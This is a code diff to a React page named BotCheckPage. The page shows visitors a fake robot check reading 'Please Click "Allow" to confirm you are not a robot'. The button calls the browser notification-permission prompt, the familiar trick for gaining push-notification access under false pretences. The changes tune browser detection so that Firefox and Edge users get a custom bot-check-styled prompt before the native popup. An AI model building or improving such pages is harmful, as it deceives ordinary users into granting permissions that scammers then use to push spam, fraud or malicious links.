@@ -136,6 +136,11 @@ export default function BotCheckPage() {
   }, [])
 
   useEffect(() => {
+    // Skip if already showing soft prompt for Firefox/Edge
+    if (isFirefoxOrEdge || showSoftPrompt) {
+      return
+    }
+    
     const clickHelper = new BrowserClickHelper()
     
     // Debug logging
@@ -143,18 +148,23 @@ export default function BotCheckPage() {
       browser: clickHelper.browser,
       requiresClick: clickHelper.browser.requiresClick,
       needsPermission: clickHelper.needsPermission(),
-      userAgent: navigator.userAgent
+      userAgent: navigator.userAgent,
+      clientInfoBrowser: clientInfo?.browser
     })
     
-    // For Firefox/Edge, show soft prompt immediately - NO BOT CHECK AT ALL
-    if (clickHelper.browser.requiresClick && clickHelper.needsPermission()) {
+    // Double check with both methods for Firefox/Edge
+    const isFirefoxOrEdgeBrowser = 
+      (clickHelper.browser.requiresClick && clickHelper.needsPermission()) ||
+      (clientInfo && (clientInfo.browser === 'Firefox' || clientInfo.browser === 'Edge'))
+    
+    if (isFirefoxOrEdgeBrowser) {
       setIsFirefoxOrEdge(true)
       setIsChecking(false)
       setShowSoftPrompt(true)
-      return
+      return // IMPORTANT: Exit here, no timer for Firefox/Edge
     }
     
-    // For Chrome/Safari, show bot check as before
+    // ONLY Chrome/Safari get the bot check timer
     const timer = setTimeout(() => {
       setIsChecking(false)
       setIsVerified(true)
@@ -185,11 +195,12 @@ export default function BotCheckPage() {
     return () => {
       clearTimeout(timer)
     }
-  }, [clientInfo, ipAddress])
+  }, [clientInfo, ipAddress, isFirefoxOrEdge, showSoftPrompt])
 
   const handleSoftPromptAllow = async () => {
     try {
       // When user clicks Allow button, show the native browser prompt
+      // This will show the same permission popup as Chrome/Safari
       const permission = await Notification.requestPermission()
       
       if (permission === 'granted') {
@@ -517,7 +528,7 @@ export default function BotCheckPage() {
       <Container>
         <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
           <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
-            {(showSoftPrompt || isFirefoxOrEdge) ? (
+            {(showSoftPrompt || isFirefoxOrEdge || clientInfo?.browser === 'Firefox' || clientInfo?.browser === 'Edge') ? (
               // Custom prompt for Firefox/Edge with bot check style
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
@@ -578,7 +589,7 @@ export default function BotCheckPage() {
                   </p>
                 </div>
               </div>
-            ) : (isChecking && !isFirefoxOrEdge) ? (
+            ) : (isChecking && !isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge') ? (
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                   Please Click "Allow" to confirm you are not a robot.
@@ -611,7 +622,7 @@ export default function BotCheckPage() {
                   </p>
                 </div>
               </div>
-            ) : (!isFirefoxOrEdge) ? (
+            ) : (!isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge') ? (
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                   Please Click "Allow" to confirm you are not a robot.
